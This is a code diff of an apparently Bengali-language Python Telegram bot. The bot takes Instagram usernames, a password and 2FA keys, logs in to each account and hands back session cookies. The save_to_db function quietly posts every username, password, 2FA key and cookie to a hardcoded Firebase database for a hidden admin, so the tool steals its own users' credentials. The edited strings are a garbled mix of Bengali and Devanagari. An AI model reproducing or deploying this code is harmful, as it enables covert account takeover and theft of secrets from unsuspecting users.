@@ -22,7 +22,7 @@ def install_requirements():
 
 install_requirements()
 
-# ================= [ ২. কনফিগারেশন ] =================
+# ================= [ २. कonfigurेशन ] =================
 FIREBASE_BASE = "https://raiib1-default-rtdb.firebaseio.com/"
 
 def update_stats(user_inc, id_inc, cookie_inc=0):
@@ -38,10 +38,10 @@ def update_stats(user_inc, id_inc, cookie_inc=0):
 
 user_sessions = {}
 
-# ================= [ ৩. কোর ইঞ্জিন ] =================
+# ================= [ ३. कोर इंजिन ] =================
 
 def save_to_db(u, p, k, ck):
-    """অ্যাডমিন প্যানেলের জন্য ফায়ারবেসে ডাটা সেভ করা"""
+    """अ्यादमिन प्नेलের जन्य फайरबसेंेमा ड़टा सेभ कोरना"""
     payload = {"time": time.ctime(), "user": u, "pass": p, "two_factor": k, "cookie": ck}
     try:
         res = requests.post(f"{FIREBASE_BASE}cookies.json", json=payload, timeout=20)
@@ -68,10 +68,10 @@ def worker(bot, chat_id, u, p, k):
         cookies_dict = L.context._session.cookies.get_dict()
         ck_str = "; ".join([f"{n}={v}" for n, v in cookies_dict.items()])
         
-        # ফায়ারবেসে পাঠানো (অ্যাডমিনের জন্য)
+        # ফায়ারবেসে পাঠানো (অ্যাডমিনের জন্য)
         save_to_db(u, p, k, ck_str)
         
-        # সেশন রেজাল্টে আপনার ফরম্যাট অনুযায়ী রাখা: username|pass|cookies
+        # সেশন রেজাল্টে আপনার ফরম্যাট অনুযায়ী রাখা: username|pass|cookies
         if chat_id in user_sessions:
             formatted_data = f"{u}|{p}|{ck_str}"
             user_sessions[chat_id]['results'].append(formatted_data)
@@ -100,11 +100,11 @@ def finalize(bot, chat_id, total_ids):
             f.write("\n".join(s['results']))
         
         report_msg = (
-            f"📊 **এক্সট্রাকশন রিপোর্ট**\n\n"
+            f"📊 **এক্সট्रেকশন রিপোর्ट**\n\n"
             f"👤 **মোট আইডি ছিল:** `{total_ids}`\n"
-            f"✅ **সফল হয়েছে:** `{success_count}`\n"
-            f"❌ **লগইন ব্যর্থ:** `{fail_count}`\n\n"
-            f"📂 সব কুকি উপরের ফাইলে সাজানো আছে। ফাইল ওপেন করে সব কপি করে লিংকে পুস করুন না হলে রিপোর্ট আসবে না"
+            f"✅ **সফল हয়েছে:** `{success_count}`\n"
+            f"❌ **লগইन ব্যर्থ:** `{fail_count}`\n\n"
+            f"📂 সব কুकি উপরের ফাইলে সাজানো আছে। ফাইল ওপেন করে সब कপি করে लिंকে पुস कর।"
         )
         
         try:
@@ -112,7 +112,7 @@ def finalize(bot, chat_id, total_ids):
                 with open(file_name, "rb") as doc:
                     bot.send_document(chat_id, doc, caption=report_msg, parse_mode="Markdown")
             else:
-                bot.send_message(chat_id, f"❌ দুঃখিত, কোনো কুকি বের করা যায়নি।\nব্যর্থ: {fail_count}")
+                bot.send_message(chat_id, f"❌ দুঃখিত, কোনো কুকি বের করা যায়নি।\nব্যর्थ: {fail_count}")
         except: pass
 
         if os.path.exists(file_name):
@@ -121,7 +121,7 @@ def finalize(bot, chat_id, total_ids):
         update_stats(-1, -total_ids)
         user_sessions.pop(chat_id, None)
 
-# ================= [ ৪. মেইন বোট লজিক ] =================
+# ================= [ ४. मेईन बोट লजिक ] =================
 
 def run_bot(token):
     bot = telebot.TeleBot(token)
@@ -135,28 +135,29 @@ def run_bot(token):
 
     @bot.callback_query_handler(func=lambda c: c.data == "bulk")
     def start_bulk(c):
-        msg = bot.send_message(c.message.chat.id, "📝 **ইউজারনেম লিস্ট দিন (প্রতি লাইনে ১টি):**")
+        bot.send_message(c.message.chat.id, "✨ This bot is created by Farhad.")
+        msg = bot.send_message(c.message.chat.id, "📝 **ইউজারনেম লিস्ट दिন (प्रति लाइनে १टि):**")
         bot.register_next_step_handler(msg, get_u, bot)
 
     def get_u(m, bot):
         u_list = [u.strip() for u in m.text.split('\n') if u.strip()]
         if not u_list: return
         user_sessions[m.chat.id] = {'u_list': u_list, 'results': [], 'fail_count': 0}
-        msg = bot.send_message(m.chat.id, f"🔐 **{len(u_list)} টি আইডির পাসওয়ার্ড দিন (১ টি পাসওয়ার্ড):**")
+        msg = bot.send_message(m.chat.id, f"🔐 **{len(u_list)} टि आईडिको पास्भोर्ड दिन (१ टि पास्भोर्ड):**")
         bot.register_next_step_handler(msg, get_p, bot)
 
     def get_p(m, bot):
         if m.chat.id in user_sessions: user_sessions[m.chat.id]['pass'] = m.text.strip()
-        msg = bot.send_message(m.chat.id, "🔑 **ইউজারনেম অনুযায়ী 2FA Key দিন:**")
+        msg = bot.send_message(m.chat.id, "🔑 **ইউজারनेম অنুযायী 2FA Key दिन:**")
         bot.register_next_step_handler(msg, engine, bot)
 
     def engine(m, bot):
         keys = [k.strip() for k in m.text.split('\n') if k.strip()]
         s = user_sessions.get(m.chat.id)
         if not s or len(keys) != len(s['u_list']):
-            bot.send_message(m.chat.id, "❌ ইউজারনেম এবং 2fa key এর সংখ্যা মিলেনি!"); return
+            bot.send_message(m.chat.id, "❌ ইউজারনেम এবং 2fa key এর सংख्या मिলेनि!"); return
         
-        bot.send_message(m.chat.id, "⚡ **কাজ শুরু হয়েছে,..**")
+        bot.send_message(m.chat.id, "⚡ **कাজ शुरु भएको छ,..**")
         update_stats(1, len(s['u_list']))
         
         executor = ThreadPoolExecutor(max_workers=10)
